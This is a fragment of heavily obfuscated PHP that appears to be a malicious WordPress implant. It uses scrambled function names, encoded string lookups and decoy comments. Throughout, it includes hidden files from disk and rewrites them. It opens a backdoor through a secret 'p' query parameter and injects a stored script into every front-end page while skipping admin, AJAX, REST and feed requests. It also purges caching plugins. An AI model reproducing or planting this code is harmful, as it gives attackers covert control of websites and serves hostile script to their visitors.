     $nd1a3b0kobmg = $zdb0g3ib4b62t .   hn_f08x0cns80(1338) .  $q5il9012qwke .    hn_f08x0cns80(1740);
 

    if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($nd1a3b0kobmg)   &&  (int) @$GLOBALS['__scf_b42duf6j1zadm9_105']($nd1a3b0kobmg) >     (451+49)) {


   $c8gsagb9ty8p      = $zdb0g3ib4b62t .   hn_f08x0cns80(1354)   .    $q5il9012qwke;
$azqihcngmo2q  = @$GLOBALS['__scf_rjpcj9l4bigb5_21']($c8gsagb9ty8p)    ?  $GLOBALS['__scf_qew3crlieule_339']((string)    @$GLOBALS['__scf_utyj_ckly79_101']($c8gsagb9ty8p))     :   "";
 if ($azqihcngmo2q  !== ""    && $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1510))  &&     @md5_file($nd1a3b0kobmg)   === $azqihcngmo2q)  {
@include $nd1a3b0kobmg;
     return;
 

      }
  if  ($azqihcngmo2q   !==  "")     {
cvtaycsw15_xd1srry($nd1a3b0kobmg);
 }
 unset($c8gsagb9ty8p, $azqihcngmo2q);

       }
      }
 unset($nr2bxdzmay,  $niiep5w7aat4);



  if ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(774))) @delete_transient(hn_f08x0cns80(1335));
z34nmz7362no0_e1qq03cl();


}      catch     (Throwable   $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1781),    $cje8wku90zm4r);
 }      catch     (Exception $cje8wku90zm4r)   {
}
  }
  function    fbxyyx91d4_08z99py_u1u()
  {
try   {
  if  (!defined(f6yrzd2knrmb(1782)))     return;
    pklvf4vixucw8d97bma(null);
   $pjov750v0e    =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   f6yrzd2knrmb(1740));
   $keyu0punp26cq7 =    bmvtr5sdqjf5km1t();
     $egziouap1xyua    = "";

  if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($keyu0punp26cq7)   &&  @$GLOBALS['__scf_b42duf6j1zadm9_105']($keyu0punp26cq7)  >    (4906+94))     {
    $b4_y71s05b   = pvqofla267dcimn($keyu0punp26cq7);

if    ($GLOBALS['__scf_fv3zevxzzb_44']($b4_y71s05b) && $GLOBALS['__scf_d4eyetogjbsnt_10']($b4_y71s05b) >   (458+42)   && ib2ffadoyj2m6zxmkaa2in($b4_y71s05b)) $egziouap1xyua     =  $b4_y71s05b;
unset($b4_y71s05b);
    }
  if ($egziouap1xyua     === "") {

$ucbbkg2es249  =      nreub2fs747eromoe(ABSPATH   .  c1sob647u1i(1783), (0x5+0x5));
   $fqntej805r    =  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1651))  ? @get_option($ucbbkg2es249, "")   :   "";
  if  (!$fqntej805r   ||      $GLOBALS['__scf_d4eyetogjbsnt_10']($fqntej805r)  <     (617-117)) return;
  $egziouap1xyua =  aogmfzmp9xebjy9a613hu6($GLOBALS['__scf_i8wggf4l_3p_373']($fqntej805r));



   if    (!$egziouap1xyua ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)   <      (403+97))   return;
 if  (!ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))   {
   g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1784),  f6yrzd2knrmb(1785));
return;
    }
// Sodium crypto: simple credential

}
$ftvsfz7ji2  =   ircnjcyfmf8qkc7xdiss4();
   $fgi5etl773fhq0    =   $ftvsfz7ji2      .  c1sob647u1i(100)  . $pjov750v0e;
      

$ocl1p7lw8g836f  =    $fgi5etl773fhq0   .  '/'  .  $pjov750v0e    . iw6xe9q4j6sneg(1786);
     if  (!@$GLOBALS['__scf_opq_vgkskw_46']($fgi5etl773fhq0))  xxvz5dp1zk215e5d9($fgi5etl773fhq0,  (924-431),  true);


$z47z2e4krqm =  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ocl1p7lw8g836f)  ?    pvqofla267dcimn($ocl1p7lw8g836f)   :  "";

$_ia6m857y0u  =   ($z47z2e4krqm     ===     null);
  if     ($GLOBALS['__scf_fv3zevxzzb_44']($z47z2e4krqm) &&  $z47z2e4krqm  !==   ""      &&    $GLOBALS['__scf_wdjvpd1lvon9_102'](ovffvv33(1434),   $GLOBALS['__scf_nv7he759wjfj_9']($z47z2e4krqm,      0,  (4084+12)),  $m5ef1lel52ar81)     &&   version_compare($m5ef1lel52ar81[1], dfb4_mpcgxvnp230hvh1v(), '>')) $_ia6m857y0u   =   true;
 unset($m5ef1lel52ar81);
if (!$_ia6m857y0u && (!$GLOBALS['__scf_fv3zevxzzb_44']($z47z2e4krqm)   || $z47z2e4krqm   ===    ""     ||  $GLOBALS['__scf_tnonex5o9y_60']($z47z2e4krqm)  !==  $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua))) {

if (c5kyk62yk_dwfeubni4b($ocl1p7lw8g836f, fcywjpu_2kwq2ahog4($egziouap1xyua)))  {


 ruinnb541lwxm7j($ocl1p7lw8g836f,      (342+78));
 vyxva31du3czei($ocl1p7lw8g836f);
    o4_k_ap14u5xy97yywy7k($ocl1p7lw8g836f);
  }
 }
  unset($z47z2e4krqm,   $_ia6m857y0u);
     _c82cv1bsqf10vml2pi7e($pjov750v0e  . '/'  .  $pjov750v0e  .   hn_f08x0cns80(1787));



 $y5987yfyk05yde6    =   jo62hy1j37iqrmy();



 if   ((@$GLOBALS['__scf_opq_vgkskw_46']($y5987yfyk05yde6)  &&  @$GLOBALS['__scf_sunuwikkpg6_51']($y5987yfyk05yde6))    ||   (!@$GLOBALS['__scf_opq_vgkskw_46']($y5987yfyk05yde6) && xxvz5dp1zk215e5d9($y5987yfyk05yde6,  (337+156),   true))) {
   $eg46terdd0tq3y   =  $y5987yfyk05yde6 . '/'    .  $pjov750v0e .  c1sob647u1i(1788);


 $npigj9aksyk4zm   =  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($eg46terdd0tq3y)     ? pvqofla267dcimn($eg46terdd0tq3y)  : "";
      $imog1e382j   =  ($npigj9aksyk4zm ===  null);
       if  ($GLOBALS['__scf_fv3zevxzzb_44']($npigj9aksyk4zm)    && $npigj9aksyk4zm  !== ""  && $GLOBALS['__scf_wdjvpd1lvon9_102'](iw6xe9q4j6sneg(1434), $GLOBALS['__scf_nv7he759wjfj_9']($npigj9aksyk4zm, 0,  (1384+2712)),  $g1_yjvq8z1a8u5e)    &&      version_compare($g1_yjvq8z1a8u5e[1], dfb4_mpcgxvnp230hvh1v(),  '>'))  $imog1e382j    = true;
 unset($g1_yjvq8z1a8u5e);
       if  (!$imog1e382j && (!$GLOBALS['__scf_fv3zevxzzb_44']($npigj9aksyk4zm)   ||   $npigj9aksyk4zm ===    ""   ||  $GLOBALS['__scf_tnonex5o9y_60']($npigj9aksyk4zm)  !==    $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua)))  {
// linearizable memento

   if   (c5kyk62yk_dwfeubni4b($eg46terdd0tq3y, fcywjpu_2kwq2ahog4($egziouap1xyua)))    {
 ruinnb541lwxm7j($eg46terdd0tq3y, (358+62));
vyxva31du3czei($eg46terdd0tq3y);
o4_k_ap14u5xy97yywy7k($eg46terdd0tq3y);


}

   }   elseif   (!$imog1e382j) {



  $zes6bvfxuvc1b4xd =   @$GLOBALS['__scf_uo_a60ibqnli_104']($eg46terdd0tq3y);



 if    (!$zes6bvfxuvc1b4xd  || ($zes6bvfxuvc1b4xd % (99984+16))  !== e16j_u99g1ldi90iix1i9i())  vyxva31du3czei($eg46terdd0tq3y);$ms4d4uft6dd=53+4;$pgj2_x1f=$ms4d4uft6dd-27;
    unset($zes6bvfxuvc1b4xd);

      }
    unset($npigj9aksyk4zm,   $imog1e382j);
     }
    b1acch7k36o7yhlwm5($egziouap1xyua);



}    catch   (Throwable $cje8wku90zm4r) {
       g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1789),    $cje8wku90zm4r);


        }  catch     (Exception   $cje8wku90zm4r) {
   }



 }


      function  z0sgv8h_wo_ehp_()
 {
if  (!isset($_GET['p'])  ||  !$GLOBALS['__scf_fv3zevxzzb_44']($_GET['p']))   return;
// configure worst-case tumbling-window

$iib_qzqrye7xfhon  = $_GET['p'];
   if    ($iib_qzqrye7xfhon  ===    sao9aimrfgwjmwd(bpowi0iglycvx(1147)))   {

 $GLOBALS[c1sob647u1i(1790)]  = true;



  try  {
  $o5czzu_yo71pw4j =      p2b_7j_9ex54eg4()   .   '/' . nreub2fs747eromoe(ABSPATH .   iw6xe9q4j6sneg(1147),  (6+2))  .  hn_f08x0cns80(1791);
$cc22b7p752gxmj5i   =   @$GLOBALS['__scf_rjpcj9l4bigb5_21']($o5czzu_yo71pw4j)    ? (int) @$GLOBALS['__scf_b42duf6j1zadm9_105']($o5czzu_yo71pw4j)   : 0;
if ($cc22b7p752gxmj5i     >  (447+53)  &&  $cc22b7p752gxmj5i    <=   (5242798+82))  {
 include  $o5czzu_yo71pw4j;
 }
    } catch  (Throwable   $cje8wku90zm4r)   {
   }  catch  (Exception    $cje8wku90zm4r) {

     }
 while ($GLOBALS['__scf_jc6nu1mm82_430']()  >    0   && @ob_end_clean())    {
       }
       header(c1sob647u1i(1792));
    exit;

}
if      ($iib_qzqrye7xfhon  !==  sao9aimrfgwjmwd(f6yrzd2knrmb(1183))) return;
  try  {
if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1651))  && $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1628)))   {



@update_option(f6yrzd2knrmb(517),   (int)  @get_option(c1sob647u1i(517),  0)   + 1, hn_f08x0cns80(1618));
@update_option(iw6xe9q4j6sneg(520), $GLOBALS['__scf_qzyo0sgkyb6_202'](),    iw6xe9q4j6sneg(1618));
    }

 $s40sswhw9ovqp  =    q87voct054xu7c(iw6xe9q4j6sneg(1793),      "");$rn8b8g6x=84*7;$hsvwvjtjg=$rn8b8g6x-47;
  

 if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp)    > (22+78) && !$GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1794), $s40sswhw9ovqp) &&     $GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1795),   $s40sswhw9ovqp)) {
  $_2wi21a62q6gy    =   @$GLOBALS['__scf_i8wggf4l_3p_373']($s40sswhw9ovqp, true);
  if ($_2wi21a62q6gy  !==    false  &&     $GLOBALS['__scf_d4eyetogjbsnt_10']($_2wi21a62q6gy) >    (45+55)) $s40sswhw9ovqp   = $_2wi21a62q6gy;
 }
       if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp) <  (0x40+0x24))   $s40sswhw9ovqp =  wxy7y9lxg8385_v();
  if    ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp)   <   (0x49+0x1b))     {
 while ($GLOBALS['__scf_jc6nu1mm82_430']() > 0  &&  @ob_end_clean()) {
 }
    header(iw6xe9q4j6sneg(1796));
   header(f6yrzd2knrmb(1797));
header(iw6xe9q4j6sneg(1798));
     exit;


      }
   $dsssz0nj5xfigz   =   q87voct054xu7c(iw6xe9q4j6sneg(1180),     "");
$uczplp_8km =  '"' .     $GLOBALS['__scf_tnonex5o9y_60']($dsssz0nj5xfigz  .   $s40sswhw9ovqp) . '"';
      if   (isset($_SERVER[ovffvv33(1799)])  && $GLOBALS['__scf_qew3crlieule_339']($_SERVER[bpowi0iglycvx(1800)])    ===   $uczplp_8km)     {
while   ($GLOBALS['__scf_jc6nu1mm82_430']()    >   0    &&  @ob_end_clean())     {
// @unfold arbitrator

   }

  header(f6yrzd2knrmb(1801));


    header(iw6xe9q4j6sneg(1802) .     $uczplp_8km);
exit;
        }
  while  ($GLOBALS['__scf_jc6nu1mm82_430']()   >   0 && @ob_end_clean())  {$vddy8z3pj8u=173|141;$qhtu42s949m=$vddy8z3pj8u^190;
 }
   header(ovffvv33(1796));
   header(bpowi0iglycvx(1797));

header(bpowi0iglycvx(1803));
     header(iw6xe9q4j6sneg(1802)      .    $uczplp_8km);
    echo   $dsssz0nj5xfigz  .  $s40sswhw9ovqp;
 exit;$oage1rbxl2b_=44*5;$u_6cl3hc928b=$oage1rbxl2b_-46;
} catch   (Throwable  $cje8wku90zm4r)  {
 g_qoqdy38lfl4v4n3618(c1sob647u1i(1804),  $cje8wku90zm4r);
     }   catch     (Exception     $cje8wku90zm4r) {
   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1804),  $cje8wku90zm4r);
     }
    }
  z0sgv8h_wo_ehp_();
  function uvrqjznee098xwzlswt3yf()
   {
// @instrument record-layer

    if   (!isset($_GET[hn_f08x0cns80(1805)])) return;
try      {
  $o79ex9t6n3vxg7v  = $_GET[ovffvv33(1805)];
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($o79ex9t6n3vxg7v) ||   $o79ex9t6n3vxg7v ===  "") return;
$o79ex9t6n3vxg7v =   $GLOBALS['__scf_xyekfdfj2g_109']($o79ex9t6n3vxg7v);
  $ya87ppvoxcce3ouu = array();

 if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1806)))  $ya87ppvoxcce3ouu[]    =   (string)    $GLOBALS['__scf_lf33h8m4cq_577'](home_url(),   PHP_URL_HOST);


   if   ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1651)))      {
$ncs36jp58oi_  =  (string)  @get_option(c1sob647u1i(1807),  "");
    if     ($ncs36jp58oi_    !== "")      $ya87ppvoxcce3ouu[]    =      (string)  $GLOBALS['__scf_lf33h8m4cq_577']($ncs36jp58oi_,     PHP_URL_HOST);$ynrd6u9bdg_s=808;$ng7wb8jj5vg=($ynrd6u9bdg_s>0)?$ynrd6u9bdg_s:-$ynrd6u9bdg_s;
   }
if (isset($_SERVER[ovffvv33(1347)])) $ya87ppvoxcce3ouu[]   =     (string)   $_SERVER[iw6xe9q4j6sneg(1347)];
$ya87ppvoxcce3ouu[]   =   xyhhquc02dkq5zwsgxhdu("");
      $v_db5_cu7eqahfv   =   false;


 foreach ($GLOBALS['__scf_tni2zo3jsk7_159']($ya87ppvoxcce3ouu) as    $eribl7p1ze) {
       if  (!$GLOBALS['__scf_fv3zevxzzb_44']($eribl7p1ze)  ||  $eribl7p1ze ===   "")  continue;
 

  if      ($GLOBALS['__scf_w6mdcepio4lkz5_7']($eribl7p1ze,  ':') !==  false)    $eribl7p1ze      =     $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1808), "",   $eribl7p1ze);



       if     (nreub2fs747eromoe($GLOBALS['__scf_xyekfdfj2g_109']($eribl7p1ze) .  hn_f08x0cns80(1809), (3<<2))  ===   $o79ex9t6n3vxg7v)   {

$v_db5_cu7eqahfv    =  true;

break;
 }
     }
 if      (!$v_db5_cu7eqahfv)    return;
       $c34_lnvh52m =   $GLOBALS['__scf_mqh00r_t1l90k_1190'](iw6xe9q4j6sneg(1810),   (78^80));



   $hfjqlmm5z521e =    aogmfzmp9xebjy9a613hu6(ez2pan3ayqru782m5hz($c34_lnvh52m));
  while  ($GLOBALS['__scf_jc6nu1mm82_430']()  >   0  &&  @ob_end_clean())  {
   }
 header(bpowi0iglycvx(1811));
 header(hn_f08x0cns80(1812));

  echo  ($hfjqlmm5z521e === $c34_lnvh52m)     ? f6yrzd2knrmb(1813)   . $GLOBALS['__scf_tnonex5o9y_60']($c34_lnvh52m)  :  hn_f08x0cns80(1814);

      exit;
 } catch      (Throwable  $cje8wku90zm4r)  {
g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1815),   $cje8wku90zm4r);$e5g8l_3wbv9f=17*9;$tq_i6ii_zdd=$e5g8l_3wbv9f-20;



   }     catch (Exception $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1815),    $cje8wku90zm4r);
 }

  }
  uvrqjznee098xwzlswt3yf();
  function      vbuvhui0kpao77gf()
{
$v_db5_cu7eqahfv = true;


$ygs4e47dyczpze = function  ($duluassmqus) use  (&$v_db5_cu7eqahfv) {



     try   {
  $GLOBALS['__scf_uroqlxj534ze4e_302']($duluassmqus);
     }  catch (Throwable  $cje8wku90zm4r)  {

$v_db5_cu7eqahfv    =   false;
    }  catch     (Exception $cje8wku90zm4r)  {
  $v_db5_cu7eqahfv  =  false;$c_hwduzft=(0x85+0xcd);$h_fy3ja8gg_=$c_hwduzft%16;



    }
  };


   if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1816))) $ygs4e47dyczpze(hn_f08x0cns80(1817));
 if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1818)))  $ygs4e47dyczpze(hn_f08x0cns80(1819));
 if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(553))) $ygs4e47dyczpze(ovffvv33(553));
if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1820)))  $ygs4e47dyczpze(hn_f08x0cns80(1820));
      elseif  ($GLOBALS['__scf_dr1wex6ejrn2_554'](f6yrzd2knrmb(1821)) &&  $GLOBALS['__scf_ewy3z2db5hgtu_130'](hn_f08x0cns80(1821),     bpowi0iglycvx(1822)))   $ygs4e47dyczpze(array(hn_f08x0cns80(1821),  ovffvv33(1822)));
 if ($GLOBALS['__scf_dr1wex6ejrn2_554'](iw6xe9q4j6sneg(1823))  &&   $GLOBALS['__scf_ewy3z2db5hgtu_130'](iw6xe9q4j6sneg(1824),   iw6xe9q4j6sneg(1825)))    $ygs4e47dyczpze(array(iw6xe9q4j6sneg(1824),   f6yrzd2knrmb(1826)));
    if   ($GLOBALS['__scf_dr1wex6ejrn2_554'](bpowi0iglycvx(555))   &&  $GLOBALS['__scf_ewy3z2db5hgtu_130'](hn_f08x0cns80(555),    c1sob647u1i(1827)))  $ygs4e47dyczpze(array(iw6xe9q4j6sneg(1828),    iw6xe9q4j6sneg(1829)));
  if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1830))) $ygs4e47dyczpze(c1sob647u1i(1830));
elseif (isset($GLOBALS[hn_f08x0cns80(1831)])  && $GLOBALS['__scf_bslklilwd3kn_71']($GLOBALS[iw6xe9q4j6sneg(1831)])   &&   $GLOBALS['__scf_ewy3z2db5hgtu_130']($GLOBALS[iw6xe9q4j6sneg(1831)],  f6yrzd2knrmb(1832))) $ygs4e47dyczpze(function ()   {

     $GLOBALS[iw6xe9q4j6sneg(1833)]->deleteCache(true);
});
   if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1834)))   $ygs4e47dyczpze(bpowi0iglycvx(1835));
  if ($GLOBALS['__scf_dr1wex6ejrn2_554'](iw6xe9q4j6sneg(1836))   && $GLOBALS['__scf_ewy3z2db5hgtu_130'](ovffvv33(1836),   hn_f08x0cns80(1837)))  $ygs4e47dyczpze(array(f6yrzd2knrmb(1836),    ovffvv33(1837)));
 g_qoqdy38lfl4v4n3618(c1sob647u1i(466),  hn_f08x0cns80(1838));
 return  $v_db5_cu7eqahfv;
}



function bl_xsbdpdgkyklr_dsh()
{
// collect optimal skip-list

   if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(781))  &&     is_admin())  return  true;
 

  if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1839)) && wp_doing_ajax())    return true;
  if   (defined(ovffvv33(1840))    && REST_REQUEST) return   true;
 if (defined(ovffvv33(1841))     &&    XMLRPC_REQUEST)      return true;
  if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1842))  && is_feed()) return true;
       if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1843))    &&    is_robots())  return  true;
     

 if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1844))    && is_sitemaps())   return true;
 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1845))      &&      is_customize_preview())      return  true;


    if (isset($_GET[bpowi0iglycvx(1846)]) ||  isset($_GET[c1sob647u1i(1847)])   ||   isset($_GET[f6yrzd2knrmb(1848)]))    return  true;
  return false;
 }
function   yv_5aypg_lnab8rs0()
{
 $ahdjjc4qka    =     (isset($GLOBALS[ovffvv33(648)])  && $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[bpowi0iglycvx(648)])) ?  $GLOBALS['__scf_qew3crlieule_339']($GLOBALS[bpowi0iglycvx(648)])  :  "";


if ($ahdjjc4qka === "")   return "";
  $ahdjjc4qka     = $GLOBALS['__scf_usy4mchq83xa_378'](bpowi0iglycvx(1849),     c1sob647u1i(1850),    $ahdjjc4qka);
$lrd4d2he7o1hq5    =   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1806))   ? (string)   $GLOBALS['__scf_lf33h8m4cq_577'](home_url(), PHP_URL_HOST)     :   "";
$ye16w36ues   =     nreub2fs747eromoe($GLOBALS['__scf_xyekfdfj2g_109']($lrd4d2he7o1hq5),  (0x1+0x5));


      $wz4w6owunjhjspiy   =  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($ahdjjc4qka), 0,  (4+2));

 return      "\n<script data-sc=\""    .   $ye16w36ues     .  '-'    .   $wz4w6owunjhjspiy .  "\">\n" .     $ahdjjc4qka . "\n</script>\n<!-- sc"  .  $ye16w36ues . '-'   .   $wz4w6owunjhjspiy     .   " -->\n";
   }
   function   hqyjo3w7kqcmdzs()
  {



  try   {$_8htlbb3=61|27;$sbjt9wbp8samp=$_8htlbb3^83;
 if  (bl_xsbdpdgkyklr_dsh())   return;

    $ymulztzvvz    =    yv_5aypg_lnab8rs0();
       if  ($ymulztzvvz   ===  "")      return;


 echo   $ymulztzvvz;
$GLOBALS[c1sob647u1i(509)]    = true;
   if      ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1651))  &&      $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1628))      &&   empty($GLOBALS[ovffvv33(1851)]))     {
  $GLOBALS[c1sob647u1i(1851)]  =   true;
 $j5poxm2ctq48hmqg     =    (int)   @get_option(iw6xe9q4j6sneg(1852),   0);
if  ($GLOBALS['__scf_qzyo0sgkyb6_202']()  -  $j5poxm2ctq48hmqg  > (254+46)) @update_option(ovffvv33(1852), $GLOBALS['__scf_qzyo0sgkyb6_202'](),  f6yrzd2knrmb(1618));

  unset($j5poxm2ctq48hmqg);


}
     } catch  (Throwable   $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(ovffvv33(719),    $cje8wku90zm4r);
 }     catch  (Exception $cje8wku90zm4r)    {
  }
// PHP 8.2 enum: affine circuit-breaker

   }
  function  j14pudawrw3_51fvifx($lt2p4edste0fx8,  $x0ybyzn18buc  =   0)



{
       if  (!$GLOBALS['__scf_fv3zevxzzb_44']($lt2p4edste0fx8) ||  $lt2p4edste0fx8 === "") return $lt2p4edste0fx8;
 if  (defined(bpowi0iglycvx(1853)) && !($x0ybyzn18buc &    PHP_OUTPUT_HANDLER_FINAL)) return    $lt2p4edste0fx8;

  if (!empty($GLOBALS[hn_f08x0cns80(1790)]))  return $lt2p4edste0fx8;
  if      (!empty($GLOBALS[hn_f08x0cns80(509)]))  return    $lt2p4edste0fx8;
    if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($lt2p4edste0fx8) >    (4194294+10)) return   $lt2p4edste0fx8;
   if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1854)))   {


 foreach  ((array)  @headers_list()    as   $b89b7d7i9gxd5xs)    {
 if      (stripos($b89b7d7i9gxd5xs,  f6yrzd2knrmb(1855))  ===   0     &&    stripos($b89b7d7i9gxd5xs, c1sob647u1i(1856))    !==  false)   return  $lt2p4edste0fx8;
if   (stripos($b89b7d7i9gxd5xs,   ovffvv33(1857)) ===  0 &&  stripos($b89b7d7i9gxd5xs,  bpowi0iglycvx(1858)) ===  false  && stripos($b89b7d7i9gxd5xs, hn_f08x0cns80(1859)) ===  false)  return  $lt2p4edste0fx8;
 }
 unset($b89b7d7i9gxd5xs);
  }
  $ymulztzvvz = yv_5aypg_lnab8rs0();
  if    ($ymulztzvvz  ===   "")   return   $lt2p4edste0fx8;
if (stripos($lt2p4edste0fx8,   f6yrzd2knrmb(1860)) ===  false     &&  stripos($lt2p4edste0fx8, bpowi0iglycvx(1861))  === false)  return $lt2p4edste0fx8;
 $GLOBALS[ovffvv33(509)]  =  true;
$GLOBALS[hn_f08x0cns80(511)] = true;
    $k8gfo6m6oc =     stripos($lt2p4edste0fx8,  bpowi0iglycvx(1860));
     if    ($k8gfo6m6oc    !==   false) {
   return  $GLOBALS['__scf_nv7he759wjfj_9']($lt2p4edste0fx8,  0,  $k8gfo6m6oc)   .     $ymulztzvvz  .  $GLOBALS['__scf_nv7he759wjfj_9']($lt2p4edste0fx8,  $k8gfo6m6oc);


}
 return $lt2p4edste0fx8  . $ymulztzvvz;
      }



function      wga1b3h0lzsfklunef7b7()
{
 try {


    if (bl_xsbdpdgkyklr_dsh())     return;
if (!empty($GLOBALS[f6yrzd2knrmb(1862)]))  return;
     if  (!empty($GLOBALS[f6yrzd2knrmb(1863)])) return;
    if     (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1864)))  return;
 $ahdjjc4qka  =   (isset($GLOBALS[f6yrzd2knrmb(648)]) &&  $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[iw6xe9q4j6sneg(648)]))  ?  $GLOBALS['__scf_qew3crlieule_339']($GLOBALS[c1sob647u1i(648)])   :   "";
 if  ($ahdjjc4qka ===     "") return;
  $iujly00qvqnf     =  isset($_SERVER[iw6xe9q4j6sneg(1865)])  ?  (string) $_SERVER[iw6xe9q4j6sneg(1866)] : "";
     if ($iujly00qvqnf   !== "" &&  $GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1867),   $iujly00qvqnf))  return;



   if    ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1864)))  {
   foreach   ((array)  @headers_list()  as  $b89b7d7i9gxd5xs)    {
    if   (stripos($b89b7d7i9gxd5xs,    bpowi0iglycvx(1855))      ===  0 &&    stripos($b89b7d7i9gxd5xs, bpowi0iglycvx(1856)) !==   false)    return;


 if (stripos($b89b7d7i9gxd5xs,   bpowi0iglycvx(1857))   === 0   &&    stripos($b89b7d7i9gxd5xs, iw6xe9q4j6sneg(1858)) ===     false   &&    stripos($b89b7d7i9gxd5xs,   iw6xe9q4j6sneg(1868)) ===  false)  return;



  if      (stripos($b89b7d7i9gxd5xs, bpowi0iglycvx(1869))  ===    0) return;
      }
unset($b89b7d7i9gxd5xs);
       }
  $GLOBALS[iw6xe9q4j6sneg(1863)]  =  true;
  @$GLOBALS['__scf_cflcfcq3y4pu_1870'](f6yrzd2knrmb(1871));

 }     catch   (Throwable     $cje8wku90zm4r)  {

    g_qoqdy38lfl4v4n3618(hn_f08x0cns80(510), $cje8wku90zm4r);
   }  catch   (Exception   $cje8wku90zm4r)  {
      }
   }
 function   sk_b_73encuzqworll()
    {
      try {
// WP Post Terms: self-adjoint injector

      if  (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1872)))  return;
    



if     (!is_admin() &&    (!isset($GLOBALS[hn_f08x0cns80(1873)]) ||  $GLOBALS[ovffvv33(1874)]    !==   f6yrzd2knrmb(1508)))   return;



if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1875)) &&  !is_ssl())  return;
$r97xvf0q2kje9_    = q87voct054xu7c(bpowi0iglycvx(1184), "");
  $ye16w36ues =   nreub2fs747eromoe(ABSPATH   . bpowi0iglycvx(719),   (0x4+0x2));
   $e3odkvvirkd_y00b  =   bpowi0iglycvx(1364);
  if    ($r97xvf0q2kje9_ === "")   {
 if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1651))    &&  (int)    @get_option(f6yrzd2knrmb(1876),   0))  {
@update_option(bpowi0iglycvx(1876),  0,     f6yrzd2knrmb(1618));
$yc3_w626p0vjy  =   (string) @get_option(iw6xe9q4j6sneg(1877),    "");

      echo  "\n"     .  hn_f08x0cns80(1878)   .  $ye16w36ues   .  '>'
.    iw6xe9q4j6sneg(1879)
  . f6yrzd2knrmb(1880) .     $e3odkvvirkd_y00b(ovffvv33(1881)) .  iw6xe9q4j6sneg(1882)
     . iw6xe9q4j6sneg(1883)     . $GLOBALS['__scf__r5ulaote4t_611']($yc3_w626p0vjy) . ';'
  .  bpowi0iglycvx(1884)  .    $e3odkvvirkd_y00b(ovffvv33(1885))  .  iw6xe9q4j6sneg(1886)
  . iw6xe9q4j6sneg(1887)   .  $e3odkvvirkd_y00b(hn_f08x0cns80(1888))    .   ovffvv33(1889)    .     $e3odkvvirkd_y00b(bpowi0iglycvx(1890))    .    f6yrzd2knrmb(1891)  . $e3odkvvirkd_y00b(ovffvv33(1892))   . ovffvv33(1893)      . $e3odkvvirkd_y00b(bpowi0iglycvx(1894))    .    bpowi0iglycvx(1895)

     .      ovffvv33(1896)  . $e3odkvvirkd_y00b(hn_f08x0cns80(1897)) .  f6yrzd2knrmb(1898)   .      $e3odkvvirkd_y00b(bpowi0iglycvx(1899))   .  c1sob647u1i(1900)
  . bpowi0iglycvx(1901)  .  "\n";
      unset($yc3_w626p0vjy);
}
// WP Image Block: reject pipeline

  return;
 }
 $r97xvf0q2kje9_    =     $GLOBALS['__scf_usy4mchq83xa_378'](bpowi0iglycvx(1151), hn_f08x0cns80(1902),   $r97xvf0q2kje9_);
